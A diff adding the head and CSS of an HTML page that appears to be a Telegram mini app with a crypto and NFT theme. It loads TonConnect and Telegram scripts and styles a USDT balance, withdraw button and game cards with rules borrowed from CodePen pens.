@@ -1,0 +1,2804 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title></title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <script type="text/javascript" src="https://rawgit.com/victornpb/f639f37373be0f6e82e1/raw/5d8f7ee8b32ae04de087d2377d8086e3389ee411/AES.js"></script>
+        <script src="https://telegram.org/js/telegram-web-app.js"></script>
+        <link rel="apple-touch-icon" type="image/png" href="https://cpwebassets.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png">
+        <meta name="apple-mobile-web-app-title" content="CodePen">
+        <link rel="shortcut icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico">
+        <link rel="mask-icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/logo-pin-b4b4269c16397ad2f0f7a01bcdf513a1994f4c94b8af2f191c09eb0d601762b1.svg" color="#111">
+    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>
+  <title>Latest transactions</title>
+    <link rel="canonical" href="https://codepen.io/havardob/pen/PoWbeoZ">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap" rel="stylesheet">
+  
+    <link rel="apple-touch-icon" type="image/png" href="https://cpwebassets.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png">
+
+    <meta name="apple-mobile-web-app-title" content="CodePen">
+
+    <link rel="shortcut icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico">
+
+    <link rel="mask-icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/logo-pin-b4b4269c16397ad2f0f7a01bcdf513a1994f4c94b8af2f191c09eb0d601762b1.svg" color="#111">
+
+
+
+  
+  
+
+  <title>Mk.Studio</title>
+
+    <link rel="canonical" href="https://codepen.io/designfenix/pen/bGvJWpz">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.2/css/bootstrap.min.css">
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+
+
+
+
+
+    </head>
+    <style>
+@import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap");
+*,
+*:after,
+*:before {
+  box-sizing: border-box;
+}
+
+body {
+  font-family: "Inter", sans-serif;
+  line-height: 1.5;
+  min-height: 100vh;
+  padding: 5rem 0;
+  font-size: clamp(1rem, 2.5vw, 1.125rem);
+  background-color: #fff;
+  overflow-x: none;
+}
+
+.fancy {
+  position: relative;
+  white-space: nowrap;
+  &:after {
+    --deco-height: 0.3125em;
+    content: "";
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: calc(var(--deco-height) * -0.625);
+    height: var(--deco-height);
+    background-image: url("data:image/svg+xml,%3Csvg width='100' height='64' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cg clip-path='url(%23a)'%3E%3Cpath d='M-17 30.5C-1 22 72-4 54 13 37.9 28.2-2.5 57.5 16 55.5s72-29 104-40' stroke='%2300FDCF' stroke-width='10'/%3E%3C/g%3E%3Cdefs%3E%3CclipPath id='a'%3E%3Cpath fill='%23fff' d='M0 0h100v64H0z'/%3E%3C/clipPath%3E%3C/defs%3E%3C/svg%3E%0A");
+    background-size: auto 100%;
+    background-repeat: round;
+    background-position: 0em;
+  }
+}
+
+section {
+  width: 90%;
+  max-width: 800px;
+  margin-left: auto;
+  margin-right: auto;
+}
+section + section {
+  margin-top: 2.5em;
+}
+
+h1 {
+  font-weight: 700;
+  line-height: 1.125;
+  font-size: clamp(1.5rem, 2.5vw, 2.5rem);
+  text-align: center;
+
+}
+#usdt{
+	font-weight: 700;
+	font-family: "Manrope", sans-serif;
+  	line-height: 1.125;
+  	font-size: clamp(2rem, 3vw, 3rem);
+	padding: 0px 0px 10px 0px;
+  	text-align: center;
+}
+
+h2 {
+  margin-top: 0.25em;
+  color: #999;
+  font-size: clamp(1.125rem, 2.5vw, 1.25rem);
+  text-align: center;
+
+}
+
+
+h2 + * {
+  margin-top: 1.5em;
+}
+
+summary {
+  background-color: transparent;
+  position: relative;
+  cursor: pointer;
+  padding: 1em 0.5em;
+  list-style: none;
+}
+summary::-webkit-details-marker {
+  display: none;
+}
+summary:hover {
+  background-color: transparent;
+}
+summary div {
+  display: flex;
+  align-items: center;
+}
+summary h3 {
+  display: flex;
+  flex-direction: column;
+}
+summary small {
+  color: #999;
+  font-size: 0.875em;
+}
+summary strong {
+  font-weight: 700;
+}
+summary span:first-child {
+  width: 4rem;
+  height: 4rem;
+  border-radius: 10px;
+  background-color: #f3e1e1;
+  display: flex;
+  flex-shrink: 0;
+  align-items: center;
+  justify-content: center;
+  margin-right: 1.25em;
+}
+summary span:first-child svg {
+  width: 2.25rem;
+  height: 2.25rem;
+}
+summary span:last-child {
+  font-weight: 700;
+  margin-left: auto;
+}
+summary:focus {
+  outline: none;
+}
+summary .plus {
+  color: #289672;
+}
+
+details {
+  border-bottom: 1px solid #b5bfd9;
+}
+details[open] {
+  box-shadow: -3px 0 0 #b5bfd9;
+}
+details:first-of-type {
+  border-top: 1px solid #b5bfd9;
+}
+details > div {
+  padding: 2em 2em 0;
+  font-size: 0.875em;
+}
+
+dl {
+  display: flex;
+  flex-wrap: wrap;
+}
+dl dt {
+  font-weight: 700;
+}
+dl div {
+  margin-right: 4em;
+  margin-bottom: 2em;
+}
+
+#hh{
+	padding: 10px;
+  display: flex;
+  justify-content: center;
+}
+
+
+.withdraw {
+	width: 150px;
+	height: 40px;
+	border-radius: 6px;
+	display: flex;
+  justify-content: center;
+  align-items: center;
+	font-weight: 700;
+	font-family: "Manrope", sans-serif;
+  	line-height: 1.125;
+  	font-size: 18px;
+
+	box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
+  cursor: pointer;
+  padding: 2px;
+}
+.support {
+	width: 125px;
+	height: 40px;
+	border-radius: 6px;
+	display: flex;
+  justify-content: center;
+  align-items: center;
+	font-weight: 700;
+  color: #fff;
+	font-family: "Manrope", sans-serif;
+  	line-height: 1.125;
+  	font-size: 12px;
+    background-color: #147ffa;
+
+	box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
+}
+
+</style>
+<style>
+@import url("https://fonts.googleapis.com/css2?family=Outfit:wght@100;200;300;400;500;600;700;800;900&display=swap");
+
+*,
+*:before,
+*:after {
+	box-sizing: border-box;
+}
+
+
+button,
+input,
+select,
+textarea {
+	font: inherit;
+}
+
+a {
+	color: inherit;
+}
+
+/* End basic CSS override */
+
+* {
+	scrollbar-width: 0;
+}
+
+*::-webkit-scrollbar {
+	background-color: transparent;
+	width: 12px;
+}
+
+*::-webkit-scrollbar-thumb {
+	border-radius: 99px;
+	background-color: #ddd;
+	border: 4px solid #fff;
+}
+
+.modal {
+	position: absolute;
+	top: 0;
+	left: 0;
+	right: 0;
+	bottom: 0;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	background-color: rgba(#000, 0.25);
+}
+
+.modal-container {
+	max-height: 90vh;
+	max-width: 500px;
+	margin-left: auto;
+	margin-right: auto;
+	background-color: #fff;
+	border-radius: 16px;
+	overflow: hidden;
+	display: flex;
+	flex-direction: column;
+	box-shadow: 0 15px 30px 0 rgba(#000, 0.25);
+	@media (max-width: 600px) {
+		width: 90%;
+	}
+}
+
+.modal-container-header {
+	padding: 16px 32px;
+	border-bottom: 1px solid #ddd;
+	display: flex;
+	align-items: center;
+	justify-content: space-between;
+}
+
+.modal-container-title {
+	display: flex;
+	align-items: center;
+	gap: 8px;
+	line-height: 1;
+	font-weight: 700;
+	font-size: 1.125;
+	svg {
+		width: 32px;
+		height: 32px;
+		color: #750550;
+	}
+}
+
+.modal-container-body {
+	padding: 24px 32px 51px;
+	overflow-y: auto;
+}
+
+.rtf {
+	h1,
+	h2,
+	h3,
+	h4,
+	h5,
+	h6 {
+		font-weight: 700;
+	}
+
+	h1 {
+		font-size: 1.5rem;
+		line-height: 1.125;
+	}
+
+	h2 {
+		font-size: 1.25rem;
+		line-height: 1.25;
+	}
+
+	h3 {
+		font-size: 1rem;
+		line-height: 1.5;
+	}
+
+	& > * + * {
+		margin-top: 1em;
+	}
+
+	& > * + :is(h1, h2, h3) {
+		margin-top: 2em;
+	}
+
+	& > :is(h1, h2, h3) + * {
+		margin-top: 0.75em;
+	}
+
+	ul,
+	ol {
+		margin-left: 20px;
+		list-style-position: inside;
+	}
+
+	ol {
+		list-style: numeric;
+	}
+
+	ul {
+		list-style: disc;
+	}
+}
+
+.modal-container-footer {
+	padding: 20px 32px;
+	display: flex;
+	align-items: center;
+	justify-content: flex-end;
+	border-top: 1px solid #ddd;
+	gap: 12px;
+	position: relative;
+	&:after {
+		content: "";
+		display: block;
+		position: absolute;
+		top: -51px;
+		left: 24px;
+		right: 24px;
+		height: 50px;
+		flex-shrink: 0;
+		background-image: linear-gradient(to top, rgba(#fff, 0.75), transparent);
+		pointer-events: none;
+	}
+}
+
+.menu {
+  position: fixed;
+  bottom: 3%;
+  left: 42%;
+  padding: 30px;
+  
+  background: #fff;
+  border-radius: 100%;
+  cursor: pointer;
+  box-shadow: 7px 7px 15px rgba(55, 84, 170, 0.15), -7px -7px 20px rgba(255, 255, 255, 1), inset 0px 0px 4px rgba(255, 255, 255, 0.2), inset 7px 7px 15px rgba(55, 84, 170, 0), inset -7px -7px 20px rgba(255, 255, 255, 0), 0px 0px 4px rgba(255, 255, 255, 0);
+  &::before, &::after {
+    content: "";
+    background: #000000;
+    border-radius: 5px;
+    width: 30px;
+    height: 5px;
+    position: absolute;
+    left: 16px;
+    top: 27px;
+    transition: 0.2s ease;
+    z-index: 1;
+  }
+  &::before {
+    transform: rotate(0deg);
+  }
+  &::after {
+    transform: rotate(-90deg);
+  }
+  &.open {
+    opacity: .9;
+    &::before {
+      transform: rotate(45deg);
+    }
+    &::after {
+      transform: rotate(-45deg);
+    }
+    .button {
+      opacity: 1;
+      pointer-events: auto;
+      &:first-of-type {
+        bottom: 40px;
+        right: 70px;
+      }
+      &:nth-of-type(2) {
+        bottom: 80px;
+        transition-delay: .05s;
+      }
+	  &:nth-of-type(3) {
+        bottom: 120px;
+		right: 60px;
+        transition-delay: .05s;
+      }
+	  &:nth-of-type(4) {
+        bottom: 120px;
+		right: -60px;
+        transition-delay: .05s;
+      }
+      &:nth-of-type(5) {
+        bottom: 165px;
+		right: 0px;
+        transition-delay: .05s;
+      }
+      &:last-of-type {
+        bottom: 40px;
+        right: -70px;
+        transition-delay: .1s;
+      }
+    }
+  }
+}
+
+.button {
+  padding: 30px;
+  border-radius: 50%;
+  cursor: pointer;
+  background: #ffffff;
+  position: absolute;
+  bottom: 0;
+  right: 0;
+  opacity: 0;
+  pointer-events: none;
+  box-shadow: inherit;
+  transition: 0.2s cubic-bezier(0.18, 0.89, 0.32, 1.28), 0.2s ease opacity, 0.2s cubic-bezier(.08,.82,.17,1) transform;
+  z-index: -1;
+  &:hover {
+    transform: scale(1.1);
+  }
+  /*&:first-of-type {
+    background: url('https://assets.codepen.io/3537853/cam.svg') no-repeat 50%/50% #000000;
+  }
+  &:nth-of-type(2) {
+    background: url('https://assets.codepen.io/3537853/img.svg') no-repeat 50%/ 50% #000000;
+  }
+  &:nth-of-type(3) {
+    background: url('https://assets.codepen.io/3537853/img.svg') no-repeat 50%/ 50% #000000;
+  }
+  &:nth-of-type(4) {
+    background: url('https://assets.codepen.io/3537853/img.svg') no-repeat 50%/ 50% #000000;
+  }
+  &:last-of-type {
+    background: url('https://assets.codepen.io/3537853/music.svg') no-repeat 50% 45%/50% 45% #000000;
+  }*/
+}
+
+
+#homescreen{
+	width: 50px;
+	height: 50px;
+	border-radius: 50%;
+  position: fixed;
+  border: 0px;
+  background: #fff;
+  border-radius: 100%;
+  cursor: pointer;
+  box-shadow: 7px 7px 15px rgba(55, 84, 170, 0.15), -7px -7px 20px rgba(255, 255, 255, 1), inset 0px 0px 4px rgba(255, 255, 255, 0.2), inset 7px 7px 15px rgba(55, 84, 170, 0), inset -7px -7px 20px rgba(255, 255, 255, 0), 0px 0px 4px rgba(255, 255, 255, 0);
+}
+
+button:focus, button:active, div:focus, div:active {
+  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+}
+
+div.scrollmenu {
+background-color: transparent;
+overflow-y: none;
+overflow-x: auto;
+white-space: nowrap;
+}
+
+div.scrollmenu div {
+display: inline-block;
+color: black;
+padding: 14px;
+text-decoration: none;
+}
+
+div.scrollmenu div:hover {
+background-color: #777;
+}
+
+.cataloggames{
+	position: relative;
+	width: 220px;
+	height: 145px;
+	border: 0px;
+	border-radius: 12px;
+  box-shadow: 7px 7px 15px rgba(55, 84, 170, 0.15), -7px -7px 20px rgba(255, 255, 255, 1), inset 0px 0px 4px rgba(255, 255, 255, 0.2), inset 7px 7px 15px rgba(55, 84, 170, 0), inset -7px -7px 20px rgba(255, 255, 255, 0), 0px 0px 4px rgba(255, 255, 255, 0);
+	background-size: 100% auto;
+	cursor: pointer;
+  
+}
+
+.GameTitle {
+	font-size: 15px;
+	line-height: 16px;	
+	color: #000;
+}
+.GameTitle span {
+	padding: 0 5px;
+	background: rgba(255,255,255,2);
+	border-radius: 3px;
+}
+
+
+</style>
+    <style>
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap");
+
+.iphone-x {
+  position: relative;
+  width: 100%;
+  height: 1000px;
+  background-color: #fbfbfb;
+  border-radius: 0;
+  box-shadow: 0px 0px 0px 11px #f1f1f1, 0px 0px 0px 13px #eeeeee, 0px 0px 0px 20px #ececec, 0 55px 40px rgba(0, 0, 0, 0.1);
+}
+@media (min-width: 410px) {
+  .iphone-x {
+    border-radius: 40px;
+    height: 90px;
+    width: 90%;
+    transform: scale(0.7);
+  }
+}
+.iphone-x:before, .iphone-x:after {
+  content: "";
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+}
+.iphone-x:after {
+  bottom: 7px;
+  width: 140px;
+  height: 4px;
+  background-color: #f1f1f1;
+  border-radius: 10px;
+}
+ i,
+ b,
+ s,
+ .content {
+  position: absolute;
+  display: block;
+  color: transparent;
+}
+ i {
+  top: 0px;
+  left: 50%;
+  transform: translate(-50%, 6px);
+  height: 8px;
+  width: 15%;
+  background-color: #dfdfdf;
+  border-radius: 8px;
+  box-shadow: inset 0px -3px 3px 0px rgba(255, 255, 255, 0.2);
+  z-index: 3;
+}
+ b {
+  left: 10%;
+  top: 0px;
+  transform: translate(180px, 4px);
+  width: 12px;
+  height: 12px;
+  background-color: #d5d5d5;
+  border-radius: 12px;
+  box-shadow: inset 0px -3px 2px 0px rgba(255, 255, 255, 0.2);
+  z-index: 3;
+}
+ b:after {
+  content: "";
+  position: absolute;
+  background-color: #adadad;
+  width: 6px;
+  height: 6px;
+  top: 2px;
+  left: 2px;
+  top: 3px;
+  left: 3px;
+  display: block;
+  border-radius: 4px;
+  box-shadow: inset 0px -2px 2px rgba(0, 0, 0, 0.2);
+}
+ .content {
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  overflow-x: hidden;
+  z-index: 1;
+  color: red;
+  background: #fbfbfb;
+  position: relative;
+  border-radius: 0;
+}
+@media (min-width: 375px) {
+  .iphone-x .content {
+    border-radius: 40px;
+  }
+}
+
+main {
+  font-family: "Poppins", sans-serif;
+  color: #fbfbfb;
+  position: relative;
+  height: 100%;
+}
+
+.intro {
+  position: absolute;
+  bottom: 0;
+  width: 100%;
+  left: 0;
+  height: 50%;
+  padding: 1rem;
+  padding-top: 30%;
+  background: linear-gradient(transparent, white, white, white);
+  z-index: 2;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+.intro__title {
+  text-align: center;
+  font-weight: 700;
+  font-size: 2rem;
+  color: #262a2f;
+  margin-bottom: 1.5rem;
+}
+.intro__description {
+  text-align: center;
+  font-weight: 400;
+  font-size: 1rem;
+  color: rgba(0, 0, 0, 0.35);
+  margin-bottom: 1.5rem;
+}
+.intro__button button {
+  border: 0;
+  outline: none;
+  padding: 1rem 1.5rem;
+  background: #f4b7a8;
+  border-radius: 60px;
+  font-size: 1.3rem;
+  font-weight: 700;
+  color: #fbfbfb;
+  transition: ease all 0.3s;
+}
+.intro__button button:hover {
+  background: #ff6f4c;
+}
+
+.launch {
+  overflow: hidden;
+  position: relative;
+  height: 100%;
+}
+.launch .wrapper-images {
+  display: flex;
+  flex-direction: column;
+  height: 150vh;
+  justify-content: center;
+  left: 50%;
+  position: absolute;
+  top: 50%;
+  opacity: 0.8;
+  transform: translate3d(-50%, -50%, 0) perspective(800px) rotatey(10deg) rotate(-10deg);
+}
+.launch .images-line {
+  -webkit-animation: runner 20s linear infinite;
+          animation: runner 20s linear infinite;
+  display: flex;
+  transform: translateX(23%);
+}
+.launch .images-line:nth-child(even) {
+  -webkit-animation-duration: 30s;
+          animation-duration: 30s;
+}
+.launch .images-line .line {
+  background-position: 50% 50%;
+  background-size: cover;
+  flex: none;
+  width: 7rem;
+  height: 10em;
+  margin: clamp(10px, 2vw, 20px);
+  position: relative;
+  transition: ease-in-out all 0.3s;
+  border-radius: 1rem;
+}
+.launch .images-line .line .img {
+  position: absolute;
+  z-index: 2;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  background-position: 50% 50%;
+  background-size: cover;
+  transition: ease-in-out all 0.3s;
+  overflow: hidden;
+  border-radius: 1rem;
+}
+.launch .images-line .line:hover .img {
+  cursor: pointer;
+  transform: scale(1.1) translatez(0px);
+}
+.launch .images-line .line:hover:after {
+  filter: blur(35px) opacity(0.8);
+}
+.launch .images-line .line:after {
+  content: "";
+  background: inherit;
+  display: block;
+  width: 100%;
+  height: 100%;
+  border-radius: 50%;
+  top: 3vh;
+  position: absolute;
+  background-size: cover;
+  z-index: -1;
+  transition: ease-in-out all 0.3s;
+  filter: blur(25px) opacity(0.8);
+}
+
+.hero {
+  aspect-ratio: 2/2;
+  background: var(--bg) no-repeat center center;
+  background-size: 120% 120%;
+  background-position: 100% 50%;
+  margin-bottom: 1rem;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-end;
+  align-items: flex-end;
+  padding: 1rem;
+}
+.hero__title {
+  font-weight: 700;
+  font-size: clamp(1.5rem, 4vw, 2.2rem);
+  margin-bottom: 0.5rem;
+}
+.hero__price {
+  font-weight: 500;
+  font-size: 1.2rem;
+  padding: 0.7rem 1rem;
+  background: rgba(255, 255, 255, 0.2);
+  border-radius: 1.2rem;
+  -webkit-backdrop-filter: blur(10px);
+          backdrop-filter: blur(10px);
+  box-shadow: 1px 1px 0 0 rgba(255, 255, 255, 0.6);
+}
+.hero__price span {
+  font-weight: 700;
+}
+
+.card-nft {
+  aspect-ratio: 2.3/3;
+  background: var(--bg) no-repeat center center;
+  background-size: auto 100%;
+  border-radius: 35px;
+  padding: 10px;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-end;
+  transition: ease all 0.3s;
+  position: relative;
+  overflow: hidden;
+}
+.card-nft:hover {
+  background-size: auto 110%;
+}
+.card-nft:after {
+  position: absolute;
+  content: "";
+  background: linear-gradient(transparent, rgba(0, 0, 0, 0.7));
+  height: 50%;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  z-index: 0;
+}
+.card-nft > * {
+  z-index: 1;
+}
+.card-nft__title {
+  font-weight: 700;
+  font-size: 1.1rem;
+}
+.card-nft__deal {
+  border: 0;
+  border-radius: 100%;
+  width: 32px;
+  height: 32px;
+}
+.card-nft__deal svg {
+  transition: ease all 0.2s;
+  transform-origin: bottom right;
+}
+.card-nft__deal:hover svg {
+  transform: rotate(10deg);
+}
+.card-nft__price {
+  font-weight: 500;
+  font-size: 0.6rem;
+  padding: 0.7rem 0.5rem;
+  background: rgba(255, 255, 255, 0.2);
+  border-radius: 1rem;
+  -webkit-backdrop-filter: blur(10px);
+          backdrop-filter: blur(10px);
+  box-shadow: 1px 1px 0 0 rgba(255, 255, 255, 0.6);
+}
+.card-nft__price span {
+  font-weight: 700;
+}
+
+.filters > button {
+  background: #303841;
+  border: 0;
+  outline: none;
+  color: #fbfbfb;
+}
+.filters > button .icon {
+  background: #fbfbfb;
+}
+.filters > button .icon svg {
+  stroke: #303841;
+}
+
+/*Dev*/
+#dev {
+  font-family: "Montserrat", sans-serif;
+  position: fixed;
+  font-size: clamp(8px, 3vw, 14px);
+  top: 10px;
+  left: 10px;
+  padding: 1em;
+  color: #383838;
+  background-color: white;
+  border-radius: 25px;
+  cursor: pointer;
+  z-index: 10;
+}
+#dev a {
+  text-decoration: none;
+  font-weight: bold;
+  color: #383838;
+  transition: ease all 0.3s;
+}
+#dev a:hover {
+  color: #ef5350;
+  text-decoration: underline;
+}
+#dev span {
+  display: inline-block;
+  transition: ease all 0.3s;
+  color: pink;
+}
+#dev span:hover {
+  transform: scale(1.2);
+}
+
+@-webkit-keyframes runner {
+  to {
+    transform: translateX(-10.3%);
+  }
+}
+
+@keyframes runner {
+  to {
+    transform: translateX(-10.3%);
+  }
+}
+</style>
+<style>
+
+.iphone-x {
+  position: relative;
+  margin: -140px auto;
+  width: 100%;
+  height: 100vh;
+  background-color: #fbfbfb;
+  border-radius: 0;
+  box-shadow: 0px 0px 0px 11px #f1f1f1, 0px 0px 0px 13px #eeeeee, 0px 0px 0px 20px #ececec, 0 55px 40px rgba(0, 0, 0, 0.1);
+}
+@media (min-width: 375px) {
+  .iphone-x {
+    border-radius: 40px;
+    height: 780px;
+    width: 360px;
+  }
+}
+.iphone-x:before, .iphone-x:after {
+  content: "";
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+}
+.iphone-x:after {
+  bottom: 7px;
+  width: 140px;
+  height: 4px;
+  background-color: #f1f1f1;
+  border-radius: 10px;
+}
+.iphone-x:before {
+  top: 0px;
+  width: 56%;
+  height: 30px;
+  background-color: #f1f1f1;
+  border-radius: 0px 0px 40px 40px;
+  z-index: 2;
+}
+.iphone-x i,
+.iphone-x b,
+.iphone-x s,
+.iphone-x .content {
+  position: absolute;
+  display: block;
+  color: transparent;
+}
+.iphone-x i {
+  top: 0px;
+  left: 50%;
+  transform: translate(-50%, 6px);
+  height: 8px;
+  width: 15%;
+  background-color: #dfdfdf;
+  border-radius: 8px;
+  box-shadow: inset 0px -3px 3px 0px rgba(255, 255, 255, 0.2);
+  z-index: 3;
+}
+.iphone-x b {
+  left: 10%;
+  top: 0px;
+  transform: translate(180px, 4px);
+  width: 12px;
+  height: 12px;
+  background-color: #d5d5d5;
+  border-radius: 12px;
+  box-shadow: inset 0px -3px 2px 0px rgba(255, 255, 255, 0.2);
+  z-index: 3;
+}
+.iphone-x b:after {
+  content: "";
+  position: absolute;
+  background-color: #adadad;
+  width: 6px;
+  height: 6px;
+  top: 2px;
+  left: 2px;
+  top: 3px;
+  left: 3px;
+  display: block;
+  border-radius: 4px;
+  box-shadow: inset 0px -2px 2px rgba(0, 0, 0, 0.2);
+}
+.iphone-x .content {
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  overflow-x: hidden;
+  z-index: 1;
+  color: red;
+  background: #fbfbfb;
+  position: relative;
+  border-radius: 0;
+}
+@media (min-width: 375px) {
+  .iphone-x .content {
+    border-radius: 40px;
+  }
+}
+
+
+.intro {
+  position: absolute;
+  bottom: 0;
+  width: 100%;
+  left: 0;
+  height: 50%;
+  padding: 1rem;
+  padding-top: 30%;
+  background: linear-gradient(transparent, white, white, white);
+  z-index: 2;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+.intro__title {
+  text-align: center;
+  font-weight: 700;
+  font-size: 2rem;
+  color: #262a2f;
+  margin-bottom: 1.5rem;
+}
+.intro__description {
+  text-align: center;
+  font-weight: 400;
+  font-size: 1rem;
+  color: rgba(0, 0, 0, 0.35);
+  margin-bottom: 1.5rem;
+}
+.intro__button button {
+  border: 0;
+  outline: none;
+  padding: 1rem 1.5rem;
+  background: #0f0f0f;
+  border-radius: 12px;
+  font-size: 1.3rem;
+  font-weight: 700;
+  color: #fbfbfb;
+  transition: ease all 0.3s;
+}
+.intro__button button:hover {
+  background: #e0e0e0;
+}
+
+.launch {
+  overflow: hidden;
+  position: relative;
+  height: 100%;
+}
+.launch .wrapper-images {
+  display: flex;
+  flex-direction: column;
+  height: 150vh;
+  justify-content: center;
+  left: 50%;
+  position: absolute;
+  top: 50%;
+  opacity: 0.8;
+  transform: translate3d(-50%, -50%, 0) perspective(800px) rotatey(10deg) rotate(-10deg);
+}
+.launch .images-line {
+  -webkit-animation: runner 20s linear infinite;
+          animation: runner 20s linear infinite;
+  display: flex;
+  transform: translateX(23%);
+}
+.launch .images-line:nth-child(even) {
+  -webkit-animation-duration: 30s;
+          animation-duration: 30s;
+}
+.launch .images-line .line {
+  background-position: 50% 50%;
+  background-size: cover;
+  flex: none;
+  width: 7rem;
+  height: 10em;
+  margin: clamp(10px, 2vw, 20px);
+  position: relative;
+  transition: ease-in-out all 0.3s;
+  border-radius: 1rem;
+}
+.launch .images-line .line .img {
+  position: absolute;
+  z-index: 2;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  background-position: 50% 50%;
+  background-size: cover;
+  transition: ease-in-out all 0.3s;
+  overflow: hidden;
+  border-radius: 1rem;
+}
+.launch .images-line .line:hover .img {
+  cursor: pointer;
+  transform: scale(1.1) translatez(0px);
+}
+.launch .images-line .line:hover:after {
+  filter: blur(35px) opacity(0.8);
+}
+.launch .images-line .line:after {
+  content: "";
+  background: inherit;
+  display: block;
+  width: 100%;
+  height: 100%;
+  border-radius: 50%;
+  top: 3vh;
+  position: absolute;
+  background-size: cover;
+  z-index: -1;
+  transition: ease-in-out all 0.3s;
+  filter: blur(25px) opacity(0.8);
+}
+
+.hero {
+  aspect-ratio: 2/2;
+  background: var(--bg) no-repeat center center;
+  background-size: 120% 120%;
+  background-position: 100% 50%;
+  margin-bottom: 1rem;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-end;
+  align-items: flex-end;
+  padding: 1rem;
+}
+.hero__title {
+  font-weight: 700;
+  font-size: clamp(1.5rem, 4vw, 2.2rem);
+  margin-bottom: 0.5rem;
+}
+.hero__price {
+  font-weight: 500;
+  font-size: 1.2rem;
+  padding: 0.7rem 1rem;
+  background: rgba(255, 255, 255, 0.2);
+  border-radius: 1.2rem;
+  -webkit-backdrop-filter: blur(10px);
+          backdrop-filter: blur(10px);
+  box-shadow: 1px 1px 0 0 rgba(255, 255, 255, 0.6);
+}
+.hero__price span {
+  font-weight: 700;
+}
+
+.card-nft {
+  aspect-ratio: 2.3/3;
+  background: var(--bg) no-repeat center center;
+  background-size: auto 100%;
+  border-radius: 35px;
+  padding: 10px;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-end;
+  transition: ease all 0.3s;
+  position: relative;
+  overflow: hidden;
+}
+.card-nft:hover {
+  background-size: auto 110%;
+}
+.card-nft:after {
+  position: absolute;
+  content: "";
+  background: linear-gradient(transparent, rgba(0, 0, 0, 0.7));
+  height: 50%;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  z-index: 0;
+}
+.card-nft > * {
+  z-index: 1;
+}
+.card-nft__title {
+  font-weight: 700;
+  font-size: 1.1rem;
+}
+.card-nft__deal {
+  border: 0;
+  border-radius: 100%;
+  width: 32px;
+  height: 32px;
+}
+.card-nft__deal svg {
+  transition: ease all 0.2s;
+  transform-origin: bottom right;
+}
+.card-nft__deal:hover svg {
+  transform: rotate(10deg);
+}
+.card-nft__price {
+  font-weight: 500;
+  font-size: 0.6rem;
+  padding: 0.7rem 0.5rem;
+  background: rgba(255, 255, 255, 0.2);
+  border-radius: 1rem;
+  -webkit-backdrop-filter: blur(10px);
+          backdrop-filter: blur(10px);
+  box-shadow: 1px 1px 0 0 rgba(255, 255, 255, 0.6);
+}
+.card-nft__price span {
+  font-weight: 700;
+}
+
+.filters > button {
+  background: #303841;
+  border: 0;
+  outline: none;
+  color: #fbfbfb;
+}
+.filters > button .icon {
+  background: #fbfbfb;
+}
+.filters > button .icon svg {
+  stroke: #303841;
+}
+
+
+
+/*Dev*/
+#dev {
+  font-family: "Montserrat", sans-serif;
+  position: fixed;
+  font-size: clamp(8px, 3vw, 14px);
+  top: 10px;
+  left: 10px;
+  padding: 1em;
+  color: #383838;
+  background-color: white;
+  border-radius: 25px;
+  cursor: pointer;
+  z-index: 10;
+}
+#dev a {
+  text-decoration: none;
+  font-weight: bold;
+  color: #383838;
+  transition: ease all 0.3s;
+}
+#dev a:hover {
+  color: #ef5350;
+  text-decoration: underline;
+}
+#dev span {
+  display: inline-block;
+  transition: ease all 0.3s;
+  color: pink;
+}
+#dev span:hover {
+  transform: scale(1.2);
+}
+
+@-webkit-keyframes runner {
+  to {
+    transform: translateX(-10.3%);
+  }
+}
+
+@keyframes runner {
+  to {
+    transform: translateX(-10.3%);
+  }
+}
+</style>
+
+<style>
